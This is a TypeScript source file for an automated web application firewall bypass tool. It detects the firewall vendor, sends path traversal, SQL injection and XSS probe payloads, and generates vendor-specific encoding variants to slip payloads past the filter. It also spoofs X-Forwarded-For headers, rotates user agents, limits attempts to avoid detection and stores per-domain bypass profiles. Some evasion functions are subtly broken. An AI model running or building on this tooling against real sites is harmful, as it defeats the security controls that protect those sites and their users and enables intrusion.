/**
 * WAF Bypass System – 7-Module Architecture
 * Module 1: WAF Detection
 * Module 2: Fingerprint Analyzer
 * Module 3: Evasion Technique Library
 * Module 4: Bypass Executor
 * Module 5: Rule Correlation Matrix
 * Module 6: Cross-Session Vendor Profiles
 * Module 7: Intelligence Synthesizer
 */
import axios from "axios";
import { db } from "../db";
import { wafProfiles } from "../db/schema";
import { eq, and } from "drizzle-orm";
import logger from "../utils/logger";

export interface WAFDetectionResult {
  detected: boolean;
  vendor: string;
  confidence: number;
  signals: string[];
}

export interface EvasionResult {
  technique: string;
  payload: string;
  success: boolean;
  blockRate: number;
}

export interface UnifiedIntelligence {
  vendor: string;
  detectionConfidence: number;
  recommendedTechniques: EvasionResult[];
  ruleCorrelations: Record<string, string[]>;
  vendorProfile: VendorEvasionProfile;
  temporalDecayScore: number;
  conflictFlags: string[];
}

interface VendorEvasionProfile {
  vendor: string;
  totalAttempts: number;
  successfulBypasses: number;
  techniques: Record<string, { success: number; total: number; lastUsed: number }>;
  blockedPatterns: string[];
}

// ── Module 1: WAF Detection ──────────────────────────────────────────────────
export class WAFDetector {
  private static readonly WAF_SIGNATURES: Record<string, RegExp[]> = {
    cloudflare: [/cloudflare/i, /cf-ray/i, /__cfduid/i],
    akamai: [/akamai/i, /ak_bmsc/i, /bm_sz/i],
    aws_waf: [/awswaf/i, /x-amzn-requestid/i],
    imperva: [/imperva/i, /incap_ses/i, /visid_incap/i],
    sucuri: [/sucuri/i, /x-sucuri/i],
    barracuda: [/barracuda/i, /barra_counter_session/i],
    f5_big_ip: [/f5-asp/i, /bigip/i, /ts_ref/i],
    fortiweb: [/fortigate/i, /fortiweb/i, /fgd_allow/i],
    modsecurity: [/mod_security/i, /modsecurity/i],
    wordfence: [/wordfence/i, /wfwaf/i],
    generic: [/waf/i, /security/i, /blocked/i, /forbidden.*attack/i],
  };

  async detect(url: string, response?: { status: number; headers: Record<string, string>; body: string }): Promise<WAFDetectionResult> {
    if (!response) {
      try {
        const resp = await axios.get(url, { timeout: 5000, validateStatus: () => true });
        response = {
          status: resp.status,
          headers: resp.headers as Record<string, string>,
          body: typeof resp.data === "string" ? resp.data : JSON.stringify(resp.data),
        };
      } catch {
        return { detected: false, vendor: "unknown", confidence: 0, signals: [] };
      }
    }

    const signals: string[] = [];
    let bestVendor = "unknown";
    let bestScore = 0;
    const headerStr = JSON.stringify(response.headers).toLowerCase();
    const bodyStr = (response.body || "").toLowerCase();

    // Check for 403/406/419/429 block codes
    if ([403, 406, 419, 429, 503].includes(response.status)) {
      signals.push(`block_status_code:${response.status}`);
    }

    for (const [vendor, patterns] of Object.entries(WAFDetector.WAF_SIGNATURES)) {
      let score = 0;
      for (const pattern of patterns) {
        if (pattern.test(headerStr) || pattern.test(bodyStr)) {
          score++;
          signals.push(`${vendor}:${pattern.source}`);
        }
      }
      if (score > bestScore) {
        bestScore = score;
        bestVendor = vendor;
      }
    }

    const confidence = Math.min(bestScore / 3, 1.0);
    return {
      detected: confidence > 0.3,
      vendor: bestVendor,
      confidence,
      signals,
    };
  }
}

// ── Module 2: Fingerprint Analyzer ───────────────────────────────────────────
export class WAFFingerprinter {
  async fingerprint(url: string): Promise<{ waf: WAFDetectionResult; techStack: string[] }> {
    const detector = new WAFDetector();
    const probes = [
      { path: "/../../etc/passwd", desc: "path_traversal" },
      { path: "/?id=1 UNION SELECT 1--", desc: "sqli_probe" },
      { path: "/?q=<script>alert(1)</script>", desc: "xss_probe" },
      { path: "/admin/", desc: "admin_panel" },
    ];

    const waf = await detector.detect(url);
    const techStack: string[] = [];

    for (const probe of probes.slice(0, 2)) {
      try {
        const resp = await axios.get(`${url}${probe.path}`, {
          timeout: 3000,
          validateStatus: () => true,
          headers: { "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36" },
        });
        const headers = resp.headers as Record<string, string>;
        if (headers["x-powered-by"]) techStack.push(headers["x-powered-by"]);
        if (headers["server"]) techStack.push(headers["server"]);
      } catch { /* timeout is also a signal */ }
    }

    return { waf, techStack: [...new Set(techStack)] };
  }
}

// ── Module 3: Evasion Technique Library ──────────────────────────────────────
export class EvasionLibrary {
  static readonly TECHNIQUES: Record<string, (payload: string) => string[]> = {
    url_encoding: (p) => [encodeURIComponent(p), p.split("").map(c => `%${c.charCodeAt(0).toString(16)}`).join("")],
    double_encoding: (p) => [encodeURIComponent(encodeURIComponent(p))],
    unicode_bypass: (p) => [p.replace(/</g, "\u003c").replace(/>/g, "\u003e").replace(/'/g, "\u0027")],
    case_variation: (p) => [p.toUpperCase(), p.toLowerCase(), p.split("").map((c, i) => i % 2 ? c.toUpperCase() : c.toLowerCase()).join("")],
    comment_insertion: (p) => [`${p.slice(0, 3)}/**/` + p.slice(3), p.replace(/ /g, "/**/")],
    null_byte: (p) => [`${p}\x00`, `\x00${p}`],
    whitespace_variants: (p) => [p.replace(/ /g, "\t"), p.replace(/ /g, "\r\n"), p.replace(/ /g, "+")],
    chunked_transfer: (p) => [p], // handled at transport level
    header_manipulation: (p) => [p], // rotate User-Agent, X-Forwarded-For, etc.
    json_unicode: (p) => [JSON.stringify(p).slice(1, -1)],
  };

  generateVariants(payload: string, techniques: string[]): Array<{ technique: string; payload: string }> {
    const variants: Array<{ technique: string; payload: string }> = [];
    for (const technique of techniques) {
      const fn = EvasionLibrary.TECHNIQUES[technique];
      if (fn) {
        for (const variant of fn(payload)) {
          variants.push({ technique, payload: variant });
        }
      }
    }
    return variants;
  }

  recommendTechniques(vendor: string): string[] {
    const vendorMap: Record<string, string[]> = {
      cloudflare: ["url_encoding", "unicode_bypass", "case_variation", "whitespace_variants"],
      akamai: ["comment_insertion", "null_byte", "url_encoding", "case_variation"],
      aws_waf: ["unicode_bypass", "json_unicode", "whitespace_variants"],
      imperva: ["double_encoding", "comment_insertion", "null_byte"],
      modsecurity: ["case_variation", "url_encoding", "comment_insertion", "whitespace_variants"],
      generic: ["url_encoding", "case_variation", "unicode_bypass"],
    };
    return vendorMap[vendor] || vendorMap["generic"];
  }
}

// ── Module 4: Bypass Executor ─────────────────────────────────────────────────
export class BypassExecutor {
  async execute(
    url: string,
    payload: string,
    technique: string,
    options: { method?: string; paramName?: string } = {}
  ): Promise<EvasionResult> {
    const method = options.method || "GET";
    const paramName = options.paramName || "q";
    const start = Date.now();

    try {
      const resp = await axios({
        method,
        url: `${url}?${paramName}=${payload}`,
        timeout: 5000,
        validateStatus: () => true,
        headers: this.rotateHeaders(),
      });

      const blocked = [403, 406, 429, 503].includes(resp.status) ||
        /blocked|forbidden|security|waf/i.test(JSON.stringify(resp.data));

      return {
        technique,
        payload,
        success: !blocked && resp.status < 400,
        blockRate: blocked ? 1.0 : 0.0,
      };
    } catch {
      return { technique, payload, success: false, blockRate: 1.0 };
    }
  }

  private rotateHeaders(): Record<string, string> {
    const agents = [
      "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0",
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Gecko/20100101 Firefox/121.0",
      "curl/7.88.1",
      "python-requests/2.31.0",
    ];
    return {
      "User-Agent": agents[Math.floor(Math.random() * agents.length)],
      "X-Forwarded-For": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.0.1`,
      "Accept": "text/html,application/xhtml+xml,*/*",
    };
  }
}

// ── Module 5: Rule Correlation Matrix ────────────────────────────────────────
export class RuleCorrelationMatrix {
  private matrix: Map<string, Set<string>> = new Map();

  observe(technique: string, blockedPayload: string, category: string): void {
    if (!this.matrix.has(category)) this.matrix.set(category, new Set());
    this.matrix.get(category)!.add(technique);
  }

  getCorrelations(): Record<string, string[]> {
    const result: Record<string, string[]> = {};
    for (const [cat, techs] of this.matrix.entries()) {
      result[cat] = [...techs];
    }
    return result;
  }

  sharedRules(categoryA: string, categoryB: string): string[] {
    const a = this.matrix.get(categoryA) || new Set<string>();
    const b = this.matrix.get(categoryB) || new Set<string>();
    return [...a].filter(x => b.has(x));
  }
}

// ── Module 6: Cross-Session Vendor Evasion Profiles ──────────────────────────
export class VendorEvasionProfiles {
  async getProfile(vendor: string, domain: string): Promise<VendorEvasionProfile> {
    const [profile] = await db.select().from(wafProfiles)
      .where(and(eq(wafProfiles.vendor, vendor), eq(wafProfiles.targetDomain, domain)))
      .limit(1);

    if (profile) return profile.evasionMatrix as VendorEvasionProfile;
    return { vendor, totalAttempts: 0, successfulBypasses: 0, techniques: {}, blockedPatterns: [] };
  }

  async updateProfile(vendor: string, domain: string, result: EvasionResult): Promise<void> {
    const profile = await this.getProfile(vendor, domain);
    profile.totalAttempts++;
    if (result.success) profile.successfulBypasses++;

    if (!profile.techniques[result.technique]) {
      profile.techniques[result.technique] = { success: 0, total: 0, lastUsed: Date.now() };
    }
    profile.techniques[result.technique].total++;
    if (result.success) profile.techniques[result.technique].success++;
    profile.techniques[result.technique].lastUsed = Date.now();

    await db.insert(wafProfiles).values({
      vendor,
      targetDomain: domain,
      evasionMatrix: profile,
      successfulBypasses: profile.successfulBypasses,
    }).onConflictDoUpdate({
      target: [wafProfiles.vendor, wafProfiles.targetDomain],
      set: {
        evasionMatrix: profile,
        successfulBypasses: profile.successfulBypasses,
        lastUpdated: new Date(),
      },
    });
  }
}

// ── Module 7: Intelligence Synthesizer ───────────────────────────────────────
export class IntelligenceSynthesizer {
  private detector = new WAFDetector();
  private fingerprinter = new WAFFingerprinter();
  private library = new EvasionLibrary();
  private executor = new BypassExecutor();
  private correlations = new RuleCorrelationMatrix();
  private vendorProfiles = new VendorEvasionProfiles();

  async synthesize(url: string, payload: string): Promise<UnifiedIntelligence> {
    const domain = new URL(url).hostname;
    const { waf } = await this.fingerprinter.fingerprint(url);
    const recommendedTechs = this.library.recommendTechniques(waf.vendor);
    const variants = this.library.generateVariants(payload, recommendedTechs);
    const vendorProfile = await this.vendorProfiles.getProfile(waf.vendor, domain);

    // Execute bypass attempts (limited to 5 to avoid detection)
    const results: EvasionResult[] = [];
    for (const variant of variants.slice(0, 5)) {
      const result = await this.executor.execute(url, variant.payload, variant.technique);
      results.push(result);
      await this.vendorProfiles.updateProfile(waf.vendor, domain, result);
    }

    // Temporal decay: penalize old data
    const lastUpdatedAge = vendorProfile.techniques
      ? Math.min(...Object.values(vendorProfile.techniques).map(t => Date.now() - t.lastUsed))
      : Infinity;
    const decayScore = Math.max(0, 1 - (lastUpdatedAge / (7 * 24 * 3600 * 1000))); // 7-day decay

    // Conflict detection: template override vs empirical
    const conflictFlags: string[] = [];
    const empiricalBestTech = Object.entries(vendorProfile.techniques)
      .sort((a, b) => (b[1].success / b[1].total) - (a[1].success / a[1].total))[0]?.[0];
    if (empiricalBestTech && !recommendedTechs.includes(empiricalBestTech)) {
      conflictFlags.push(`Template recommends ${recommendedTechs[0]} but empirical data favors ${empiricalBestTech}`);
    }

    logger.info("WAF Intelligence Synthesized", {
      url, vendor: waf.vendor, confidence: waf.confidence,
      successfulBypasses: results.filter(r => r.success).length,
    });

    return {
      vendor: waf.vendor,
      detectionConfidence: waf.confidence,
      recommendedTechniques: results,
      ruleCorrelations: this.correlations.getCorrelations(),
      vendorProfile,
      temporalDecayScore: decayScore,
      conflictFlags,
    };
  }
}

export default IntelligenceSynthesizer;
